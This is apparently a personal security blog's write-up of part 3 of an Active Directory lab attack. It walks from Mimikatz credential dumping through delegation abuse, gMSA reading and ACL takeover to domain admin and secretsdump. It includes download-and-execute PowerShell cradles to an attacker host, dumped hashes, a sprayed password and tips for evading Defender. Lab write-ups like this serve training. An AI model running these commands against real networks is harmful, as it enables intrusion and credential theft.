<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="AD Pwnage: Ninja Hackers Academy Part 3" /><meta name="author" content="crypt0ace" /><meta property="og:locale" content="en" /><meta name="description" content="Hacking into NHA - AD based Lab Red Team way." /><meta property="og:description" content="Hacking into NHA - AD based Lab Red Team way." /><link rel="canonical" href="https://crypt0ace.github.io/posts/NHA-Part-3/" /><meta property="og:url" content="https://crypt0ace.github.io/posts/NHA-Part-3/" /><meta property="og:site_name" content="Crypt0ace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-02-05T00:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="AD Pwnage: Ninja Hackers Academy Part 3" /><meta name="twitter:site" content="@crypt0acee" /><meta name="twitter:creator" content="@crypt0ace" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"crypt0ace"},"dateModified":"2024-03-30T03:38:11+05:00","datePublished":"2024-02-05T00:00:00+05:00","description":"Hacking into NHA - AD based Lab Red Team way.","headline":"AD Pwnage: Ninja Hackers Academy Part 3","mainEntityOfPage":{"@type":"WebPage","@id":"https://crypt0ace.github.io/posts/NHA-Part-3/"},"url":"https://crypt0ace.github.io/posts/NHA-Part-3/"}</script><title>AD Pwnage: Ninja Hackers Academy Part 3 | Crypt0ace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Crypt0ace"><meta name="application-name" content="Crypt0ace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Crypt0ace</a></div><div class="site-subtitle font-italic">A Cybersecurity Blog by Ahmed Sher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/crypt0ace" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/crypt0acee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ahmedsherfreelance','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/ahmed-sher-93234a206/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>AD Pwnage: Ninja Hackers Academy Part 3</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>AD Pwnage: Ninja Hackers Academy Part 3</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1707073200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 5, 2024 </em> </span> <span> Updated <em class="" data-ts="1711751891" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 30, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Ahmed Sher </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1105 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In the previous one, we pivoted from one machine to another using the <code class="language-plaintext highlighter-rouge">GenericAll</code> privileges over a container and then using RBCD to successfully generate a ticket that gave us the keys as Administrator to the <code class="language-plaintext highlighter-rouge">WEB$</code> machine. In this one we are going to see how we can go from there to other machines. The goal here is to reach domain admin in this domain and then do some trust hax and jump to any other forest that there might be (there is. this should have been covered by the reader in the previous posts when we got iniital access to the domain.)</p><h2 id="harvesting-creds"><span class="mr-2">Harvesting Creds</span><a href="#harvesting-creds" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Before going nay further, we will make sure not to lose access. For that I’ll run the same modified <code class="language-plaintext highlighter-rouge">Invoke-Mimikatz.ps1</code> script. I have added the following lines in the end of the script.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Invoke-Mimikatz <span class="nt">-DumpCreds</span>
Invoke-Mimikatz <span class="nt">-Command</span> <span class="s2">"token::elevate lsadump::sam exit"</span>
Invoke-Mimikatz <span class="nt">-Command</span> <span class="s2">"token::elevate sekurlsa::ekeys exit"</span>
</pre></table></code></div></div><p>So using the same command we can dump some hashes.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>powershell <span class="nt">-exec</span> bypass <span class="nt">-c</span> <span class="s2">"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.58.50/safedogz.ps1') -UseBasicParsing | iex"</span>
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/web_hashes.png" alt="WEB Hashes" data-proofer-ignore></p><p>Notably, we get the follwoing hashes that we need to save.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Administrator:0c532fcf2046010cb8d38eedf5e45312
frank:d4fad93561dee253398d5891e991a6fb
WEB$:1cee40630bb1fe3f4ae2adfc6e7ec977
</pre></table></code></div></div><p>With this, we seem to have a user account. One we didn’t have previously. We can try to see what this account can access using this command.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netexec smb 192.168.58.0/24 <span class="nt">-u</span> frank <span class="nt">-H</span> d4fad93561dee253398d5891e991a6fb
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/frank_hash.png" alt="Frank Hash" data-proofer-ignore></p><p>We can use <code class="language-plaintext highlighter-rouge">evil-winrm</code> to login to any of these machines and confirm our access.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>evil-winrm <span class="nt">-i</span> 192.168.58.21 <span class="nt">-u</span> frank <span class="nt">-H</span> d4fad93561dee253398d5891e991a6fb
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/frank_web.png" alt="Frank Web Access" data-proofer-ignore></p><h2 id="bloodhound-to-the-rescue-again"><span class="mr-2">BloodHound to the rescue (again…)</span><a href="#bloodhound-to-the-rescue-again" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After this, we can try to find something interesting in the machines itself, locating passwords from browsers etc. and such. I have tried it. Couldn’t find anything worth while. We can move over to BloodHound again. We can start by marking assets that we have access to now as owned. Then map a path from the owned principles to other assets in the domain. While doing it for <code class="language-plaintext highlighter-rouge">SHARE$</code> machine, I can see that user <code class="language-plaintext highlighter-rouge">frank</code> has a right to delegate to that machine. We can confirm this by using this command.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>findDelegation.py academy.ninja.lan/frank <span class="nt">-hashes</span> d4fad93561dee253398d5891e991a6fb:d4fad93561dee253398d5891e991a6fb <span class="nt">-dc-ip</span> 192.168.58.20
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/delegations.png" alt="List Delegations" data-proofer-ignore></p><p>This shows us that user <code class="language-plaintext highlighter-rouge">frank</code> has Constrained Delegation with Protocol Transition rights for the <code class="language-plaintext highlighter-rouge">eventlog</code> service. This can be read about <a href="https://www.thehacker.recipes/a-d/movement/kerberos/delegations/constrained#with-protocol-transition">here</a>. As seen here, <code class="language-plaintext highlighter-rouge">frank</code> has the rights to the service <code class="language-plaintext highlighter-rouge">eventlog</code>. This can be misused by creating a service ticket by using the user <code class="language-plaintext highlighter-rouge">frank</code> which will impersonate <code class="language-plaintext highlighter-rouge">Administrator</code> to the service <code class="language-plaintext highlighter-rouge">eventlog</code>. But we will also provide a diferent service using the <code class="language-plaintext highlighter-rouge">altservice</code> flag of <code class="language-plaintext highlighter-rouge">CIFS</code> which will help us access the file system or use tools like <code class="language-plaintext highlighter-rouge">PSExec</code> or <code class="language-plaintext highlighter-rouge">SMBExec</code>. This happens because the service name part of the ticket is not protected so we can change it whatever we like. One thing to note, the original Impacket’s <code class="language-plaintext highlighter-rouge">getST.py</code> will not have the option for <code class="language-plaintext highlighter-rouge">altservice</code>. You can use <a href="https://github.com/ShutdownRepo/impacket/tree/getST">this</a> to get the one with this flag.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/opt/impacket-getst/examples/getST.py <span class="nt">-spn</span> <span class="s1">'eventlog/share'</span> <span class="nt">-altservice</span> <span class="s1">'cifs/share'</span> <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> <span class="s1">'academy.ninja.lan'</span> <span class="s2">"academy.ninja.lan"</span>/<span class="s2">"frank"</span> <span class="nt">-hashes</span> d4fad93561dee253398d5891e991a6fb:d4fad93561dee253398d5891e991a6fb
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/constrained.png" alt="Asking Service Ticket" data-proofer-ignore></p><p>After this we can export it and see if it works using <code class="language-plaintext highlighter-rouge">SMBExec.py</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@cifs_share@ACADEMY.NINJA.LAN.ccache

smbexec.py @share <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 192.168.58.20 <span class="nt">-target-ip</span> 192.168.58.23
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/share_shell.png" alt="Shell on SHARE" data-proofer-ignore></p><p>On thing to mention, the usual Impacket was immediately getting detected. But for some reason Impacket for Exegol was not. That worked fine. You can find that <a href="https://github.com/ThePorgs/impacket">here</a>. After moving it to our C2, we can look around for some thing interesting. I found a <code class="language-plaintext highlighter-rouge">bot.ps1</code> script that contains the password of <code class="language-plaintext highlighter-rouge">frank</code> user.</p><p><img data-src="/assets/img/NHA/frank_pass.png" alt="Frank Password" data-proofer-ignore></p><p>We can try to spray this password over all the users in the domain to find if we can find another user with this same password.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netexec smb 192.168.58.20 <span class="nt">-u</span> creds/academy_users.txt <span class="nt">-p</span> <span class="s1">'Il0ve!R4men_&lt;3'</span> <span class="nt">--continue-on-success</span>
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/spray.png" alt="Password Spray" data-proofer-ignore></p><h2 id="gmsa-dumping"><span class="mr-2">GMSA Dumping</span><a href="#gmsa-dumping" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>That doesn’t give us much. We can move back to BloodHound to check what we can find. By looking around, we can find that the machine we just got into has the ability to read GMSA password of the <code class="language-plaintext highlighter-rouge">gmsaNFS$</code> machine. This is, as the name suggests, a NFS or a file share account which is a machine account.</p><p><img data-src="/assets/img/NHA/gmsa.png" alt="GMSANFS$ Path" data-proofer-ignore></p><p>For this, we would need the machine account hash for <code class="language-plaintext highlighter-rouge">SHARE$</code>. After aquiring the hash we can use <code class="language-plaintext highlighter-rouge">gMSADumper.py</code> to confirm that <code class="language-plaintext highlighter-rouge">SHARE$</code> can read the password. For some reason it was not dumping the password itself.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python /opt/gMSADumper/gMSADumper.py <span class="nt">-u</span> SHARE<span class="nv">$ </span><span class="nt">-p</span> 791782105dd864621fbbf9e0fbed9fc7:791782105dd864621fbbf9e0fbed9fc7 <span class="nt">-d</span> academy.ninja.lan <span class="nt">-l</span> dc-ac.academy.ninja.lan
</pre></table></code></div></div><p>At this point, the default havoc payload was not working. <a href="https://github.com/Maldev-Academy/MaldevAcademyLdr.1">This</a> is my new best friend (lowkey waiting for a discount or a giveaway…). If after access its giving you troubles, you can always remove the defender definitions to make eveything else be nice.</p><p><img data-src="/assets/img/NHA/gmsa_share.png" alt="GMSANFS$ Read" data-proofer-ignore></p><p>We can use <a href="https://github.com/rvazarkar/GMSAPasswordReader">this</a> to dump the passwords instead using havoc.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dotnet inline-execute /opt/Toolies/GMSAPasswordReader.exe <span class="nt">--AccountName</span> gmsaNFS<span class="err">$</span>
</pre></table></code></div></div><p>And we get the hashes.</p><p><img data-src="/assets/img/NHA/dump_gmsa.png" alt="Dumped GMSANFS$" data-proofer-ignore></p><h2 id="acl-pwning"><span class="mr-2">ACL Pwning</span><a href="#acl-pwning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Having a look in BloodHound we can see that the machine <code class="language-plaintext highlighter-rouge">gmsaNFS$</code> has an ACL <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> over the backup user. We can use PowerView to do this.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://192.168.58.50/PowerView.ps1'</span><span class="o">)</span>

<span class="nv">$NewPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'Password123!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
Set-DomainUserPassword <span class="nt">-Identity</span> <span class="s1">'backup'</span> <span class="nt">-AccountPassword</span> <span class="nv">$NewPassword</span>
</pre></table></code></div></div><p>After this, we canfirm it using <code class="language-plaintext highlighter-rouge">netexec</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netexec smb 192.168.58.20 <span class="nt">-u</span> backup <span class="nt">-p</span> <span class="s1">'Password123!'</span>
</pre></table></code></div></div><p><img data-src="/assets/img/NHA/backup_user.png" alt="Backup User" data-proofer-ignore></p><h2 id="over-to-the-domain-admin"><span class="mr-2">Over to the Domain Admin</span><a href="#over-to-the-domain-admin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Back to good ol’ bloodhound. We can see that this user basicallty carries the keys to the domain.</p><p><img data-src="/assets/img/NHA/backup_blood.png" alt="Backup Bloodhound" data-proofer-ignore></p><p>We can again confirm that using <code class="language-plaintext highlighter-rouge">owneredit.py</code> from the ShutDownRepo fork of <code class="language-plaintext highlighter-rouge">impacket</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/opt/impacket-getst/examples/owneredit.py <span class="nt">-action</span> <span class="nb">read</span> <span class="nt">-target</span> <span class="s1">'Domain Admins'</span> academy.ninja.lan/backup:<span class="s1">'Password123!'</span>
</pre></table></code></div></div><p>We can use this to change the owner of the Domain Admins group to <code class="language-plaintext highlighter-rouge">backup</code> as well.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/opt/impacket-getst/examples/owneredit.py <span class="nt">-action</span> write <span class="nt">-new-owner</span> <span class="s1">'backup'</span> <span class="nt">-target</span> <span class="s1">'Domain Admins'</span> academy.ninja.lan/backup:<span class="s1">'Password123!'</span>
</pre></table></code></div></div><p>Once that is done we can easily update the user <code class="language-plaintext highlighter-rouge">backup</code> to have <code class="language-plaintext highlighter-rouge">GenericAll</code> privileges over the <code class="language-plaintext highlighter-rouge">Domain Admins</code> group using <code class="language-plaintext highlighter-rouge">dacledit.py</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dacledit.py <span class="nt">-action</span> <span class="s1">'write'</span> <span class="nt">-rights</span> <span class="s1">'FullControl'</span> <span class="nt">-principal</span> backup  <span class="nt">-target</span> <span class="s1">'Domain Admins'</span> <span class="s1">'academy.ninja.lan'</span>/<span class="s1">'backup'</span>:<span class="s1">'Password123!'</span> 
</pre></table></code></div></div><p>This can again be confirmed using BloodHound dump.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bloodhound-python <span class="nt">-c</span> all <span class="nt">-d</span> academy.ninja.lan <span class="nt">-v</span> <span class="nt">-u</span> backup <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-ns</span> 192.168.58.20 <span class="nt">--zip</span>
</pre></table></code></div></div><p>Once that is confirmed, the only thing remaining is really just adding ourselves in the <code class="language-plaintext highlighter-rouge">Domain Admins</code> group.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>net rpc group addmem <span class="s1">'Domain Admins'</span> backup <span class="nt">-U</span> academy.ninja.lan/backup <span class="nt">-S</span> 192.168.58.20
</pre></table></code></div></div><p>Confirming it works. <img data-src="/assets/img/NHA/backup_domainadmin.png" alt="Backup Domain Admin" data-proofer-ignore></p><p>With all this out of the way, we can finally dump the domain secrets using <code class="language-plaintext highlighter-rouge">secretsdump.py</code> and pwn the whole domain.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>impacket-secretsdump <span class="s1">'academy.ninja.lan'</span>/<span class="s1">'backup'</span>:<span class="s1">'Password123!'</span>@192.168.58.20 <span class="nt">-dc-ip</span> 192.168.58.20 <span class="nt">-outputfile</span> domain
</pre></table></code></div></div><p><br /></p><p><img data-src="/assets/img/NHA/secrets.png" alt="Secrets Dump" data-proofer-ignore></p><p>Finally, we can log in to the domain controller to confirm.</p><p><img data-src="/assets/img/NHA/domain_admin.png" alt="Domain Admin" data-proofer-ignore></p><p>This marks the end of the third post with us being the domain administrator in the domain. But the work is not finished. In the next one we will move from this domain to the other domain in the trust relationship. Let me know if I missed or messed up a step. Be happy to help!</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/red-team/" class="post-tag no-text-decoration" >Red Team</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=AD+Pwnage%3A+Ninja+Hackers+Academy+Part+3+-+Crypt0ace&url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FNHA-Part-3%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=AD+Pwnage%3A+Ninja+Hackers+Academy+Part+3+-+Crypt0ace&u=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FNHA-Part-3%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FNHA-Part-3%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/NHA-Part-3/">AD Pwnage: Ninja Hackers Academy Part 3</a><li><a href="/posts/NHA-Part-2/">AD Pwnage: Ninja Hackers Academy Part 2</a><li><a href="/posts/Using-DInvoke-For-Offensive-Tool-Development/">Using D/Invoke for Offensive Tool Development in C#</a><li><a href="/posts/Staying-under-the-Radar-Part-2/">Staying Under the Radar - Part 2 - Hiding IAT using Delegates</a><li><a href="/posts/Shellcode-Injection-Techniques/">Shellcode Injection in C# - Part 1 - Process Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-2/"><div class="card-body"> <em class="small" data-ts="1662663600" data-df="ll" > Sep 9, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 2 - Process Hollowing</h3><div class="text-muted small"><p> Introduction This post is part 2 of shellcode injection techniques. You can read part 1 here. In this one, we will look into Process Hollowing in C#. Process Hollowing Process Hollowing is a techn...</p></div></div></a></div><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-3/"><div class="card-body"> <em class="small" data-ts="1663268400" data-df="ll" > Sep 16, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird</h3><div class="text-muted small"><p> Introduction In this post we are going to look at another method for shellcode execution. THis involves using the API call QueueUserAPC. Like previous Process Hollowing, in this we are going to ope...</p></div></div></a></div><div class="card"> <a href="/posts/Staying-under-the-Radar/"><div class="card-body"> <em class="small" data-ts="1663441200" data-df="ll" > Sep 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Staying Under the Radar - Part 1 - PPID 